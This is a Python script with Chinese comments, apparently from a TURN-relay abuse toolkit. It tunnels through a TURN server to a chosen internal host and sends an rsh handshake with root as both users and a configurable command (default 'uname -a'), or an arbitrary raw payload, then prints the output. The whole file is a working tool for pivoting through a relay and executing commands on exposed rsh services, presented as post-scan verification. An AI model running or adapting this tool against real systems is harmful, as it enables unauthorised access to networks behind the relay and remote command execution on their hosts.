#!/usr/bin/env python3
"""
RSH Client via TCP TURN

通过 TURN 隧道连接远端的 rsh (`in.rshd`) 服务，发送基础握手并尝试获取返回输出或错误信息，
用于在端口扫描后进一步验证 514/tcp 是否真为 rsh 服务。
"""

import argparse
import os
import socket
import sys
from typing import Optional

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = os.path.abspath(os.path.join(CURRENT_DIR, ".."))
TURN_UTILS_DIR = os.path.join(PROJECT_ROOT, "turn_utils")

for path in (PROJECT_ROOT, TURN_UTILS_DIR):
    if path not in sys.path:
        sys.path.insert(0, path)

from turn_utils import (  # type: ignore
    resolve_server_address,
    resolve_peer_address,
    tcp_connect,
    tcp_connection_bind,
)
from test_turn_capabilities import allocate_tcp_with_fallback  # type: ignore
from turn_client import create_permission  # type: ignore
from config import DEFAULT_TURN_SERVER, DEFAULT_TURN_PORT  # type: ignore


class RSHTURNClient:
    """通过 TURN 服务器访问 rsh 服务，并尝试获取 banner / 错误输出"""

    def __init__(
        self,
        target_host: str,
        target_port: int = 514,
        turn_server: Optional[str] = None,
        turn_port: Optional[int] = None,
        username: Optional[str] = None,
        password: Optional[str] = None,
        realm: Optional[str] = None,
        use_tls: bool = False,
        local_user: str = "root",
        remote_user: str = "root",
        command: str = "uname -a",
        stderr_port: int = 0,
        recv_timeout: float = 5.0,
        raw_payload: Optional[str] = None,
        append_newline: bool = False,
    ):
        self.target_host = target_host
        self.target_port = target_port
        self.turn_server = turn_server or DEFAULT_TURN_SERVER
        self.turn_port = turn_port or DEFAULT_TURN_PORT
        self.username = username
        self.password = password
        self.realm = realm
        self.use_tls = use_tls
        self.local_user = local_user
        self.remote_user = remote_user
        self.command = command
        self.stderr_port = stderr_port
        self.recv_timeout = recv_timeout
        self.raw_payload = raw_payload
        self.append_newline = append_newline

        self.control_sock: Optional[socket.socket] = None
        self.data_sock: Optional[socket.socket] = None
        self.actual_server_address: Optional[tuple[str, int]] = None
        self.nonce = None
        self.realm_value = None
        self.integrity_key = None
        self.mi_algorithm = None

    def connect(self) -> bool:
        print(f"[+] 通过 TURN 连接 rsh {self.target_host}:{self.target_port}")

        server_address = resolve_server_address(self.turn_server, self.turn_port)
        if not server_address:
            print("[-] 无法解析 TURN 服务器地址")
            return False
        print(f"[+] 使用 TURN 服务器: {server_address}")

        allocation_result, is_short_term = allocate_tcp_with_fallback(
            server_address,
            self.username,
            self.password,
            self.realm,
            self.use_tls,
        )
        if not allocation_result:
            print("[-] TURN 中继分配失败")
            return False

        (
            self.control_sock,
            self.nonce,
            self.realm_value,
            self.integrity_key,
            self.actual_server_address,
            *extra,
        ) = allocation_result
        if extra:
            self.mi_algorithm = extra[0]

        print(
            "[+] TURN 分配成功 (使用短期凭据)"
            if is_short_term
            else "[+] TURN 分配成功 (使用长期凭据)"
        )

        peer_ip = resolve_peer_address(self.target_host)
        if not peer_ip:
            print(f"[-] 无法解析目标 {self.target_host}")
            self._cleanup()
            return False
        print(f"[+] 解析目标 {self.target_host} -> {peer_ip}")

        if not create_permission(
            self.control_sock,
            self.nonce,
            self.realm_value,
            self.integrity_key,
            peer_ip,
            self.target_port,
            self.actual_server_address,
            self.username,
            self.mi_algorithm,
        ):
            print("[-] CreatePermission 失败")
            self._cleanup()
            return False

        print(f"[+] 发起 TCP 连接 -> {peer_ip}:{self.target_port}")
        connection_id, error_info = tcp_connect(
            self.control_sock,
            self.nonce,
            self.realm_value,
            self.integrity_key,
            peer_ip,
            self.target_port,
            self.username,
            self.mi_algorithm,
        )
        if not connection_id:
            if error_info:
                print(f"[-] Connect 请求失败: {error_info.get('message', 'Unknown error')}")
            else:
                print("[-] Connect 请求失败")
            self._cleanup()
            return False

        print(f"[+] 获得 connection id: {connection_id}")

        assert self.actual_server_address is not None
        self.data_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.data_sock.settimeout(self.recv_timeout)
        self.data_sock.connect(self.actual_server_address)
        print("[+] 与 TURN 中继建立数据连接")

        if not tcp_connection_bind(
            self.data_sock,
            self.nonce,
            self.realm_value,
            self.integrity_key,
            connection_id,
            self.actual_server_address,
            self.username,
            self.mi_algorithm,
        ):
            print("[-] 绑定数据连接失败")
            self._cleanup()
            return False

        print("[+] 数据连接绑定成功，准备发送数据")
        return True

    def perform_rsh_handshake(self) -> None:
        if not self.data_sock:
            print("[-] 尚未建立数据连接")
            return

        if self.raw_payload is not None:
            payload = self.raw_payload
            if self.append_newline and not payload.endswith("\n"):
                payload += "\n"
            data = payload.encode("utf-8", errors="replace")
            print(f"[+] 发送原始 Payload ({len(data)} bytes): {data!r}")
            try:
                self.data_sock.sendall(data)
            except Exception as exc:
                print(f"[-] 发送原始数据失败: {exc}")
                return
            self._read_stream()
            return

        payload_str = (
            f"{self.stderr_port}\x00"
            f"{self.local_user}\x00"
            f"{self.remote_user}\x00"
            f"{self.command}\x00"
        )
        payload = payload_str.encode("utf-8")
        print(f"[+] 发送 rsh 握手: {payload!r}")

        try:
            self.data_sock.sendall(payload)
        except Exception as exc:
            print(f"[-] 发送握手失败: {exc}")
            return

        try:
            status = self.data_sock.recv(1)
        except socket.timeout:
            print("[!] 等待响应超时 (未收到状态字节)")
            return
        except Exception as exc:
            print(f"[-] 接收状态字节失败: {exc}")
            return

        if not status:
            print("[-] 连接被关闭，未收到任何状态字节")
            return

        if status == b"\x00":
            print("[+] 服务返回 0，表示已接受命令，读取输出...")
            self._read_stream()
            return

        print(f"[!] 服务返回错误状态字节: {status!r}，尝试读取错误信息")
        self._read_stream()

    def _read_stream(self) -> None:
        """持续读取服务器返回的数据，直至超时或连接关闭"""
        if not self.data_sock:
            return
        chunks = []
        while True:
            try:
                data = self.data_sock.recv(4096)
                if not data:
                    break
                chunks.append(data)
                if len(data) < 4096:
                    # 很可能已经接收完
                    break
            except socket.timeout:
                print("[!] 读取数据超时，可能还有更多内容未返回")
                break
            except Exception as exc:
                print(f"[-] 读取数据失败: {exc}")
                break

        if not chunks:
            print("[!] 未收到任何额外输出")
            return

        output = b"".join(chunks)
        try:
            decoded = output.decode("utf-8", errors="replace")
        except Exception:
            decoded = output.decode("latin-1", errors="replace")
        print("========== rsh 输出开始 ==========")
        print(decoded.strip("\r\n"))
        print("========== rsh 输出结束 ==========")

    def _cleanup(self):
        if self.data_sock:
            try:
                self.data_sock.close()
            except Exception:
                pass
            self.data_sock = None
        if self.control_sock:
            try:
                self.control_sock.close()
            except Exception:
                pass
            self.control_sock = None

    def close(self):
        self._cleanup()
        print("[+] 连接已关闭")


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description="RSH Client via TCP TURN")
    parser.add_argument("--target-host", required=True, help="目标 rsh 主机 / IP")
    parser.add_argument("--target-port", type=int, default=514, help="目标端口 (默认 514)")
    parser.add_argument("--turn-server", help="TURN 服务器主机名")
    parser.add_argument("--turn-port", type=int, help="TURN 服务器端口")
    parser.add_argument("--username", help="TURN 用户名")
    parser.add_argument("--password", help="TURN 密码")
    parser.add_argument("--realm", help="TURN 认证 realm")
    parser.add_argument("--tls", action="store_true", help="TURN 连接启用 TLS")
    parser.add_argument("--local-user", default="root", help="rsh 本地用户名 (默认 root)")
    parser.add_argument("--remote-user", default="root", help="rsh 远端用户名 (默认 root)")
    parser.add_argument("--command", default="uname -a", help="执行的命令 (默认 uname -a)")
    parser.add_argument(
        "--stderr-port",
        type=int,
        default=0,
        help="rsh Stderr 端口 (0 表示忽略单独 stderr 连接)",
    )
    parser.add_argument(
        "--timeout",
        type=float,
        default=5.0,
        help="数据读取超时（秒），默认 5 秒",
    )
    parser.add_argument(
        "--raw-payload",
        help="直接发送的原始数据（UTF-8），会跳过 rsh 握手",
    )
    parser.add_argument(
        "--append-newline",
        action="store_true",
        help="发送原始数据时在末尾自动追加换行",
    )
    return parser


def main():
    parser = build_parser()
    args = parser.parse_args()

    client = RSHTURNClient(
        target_host=args.target_host,
        target_port=args.target_port,
        turn_server=args.turn_server,
        turn_port=args.turn_port,
        username=args.username,
        password=args.password,
        realm=args.realm,
        use_tls=args.tls,
        local_user=args.local_user,
        remote_user=args.remote_user,
        command=args.command,
        stderr_port=args.stderr_port,
        recv_timeout=args.timeout,
        raw_payload=args.raw_payload,
        append_newline=args.append_newline,
    )

    try:
        if client.connect():
            client.perform_rsh_handshake()
    finally:
        client.close()


if __name__ == "__main__":
    main()

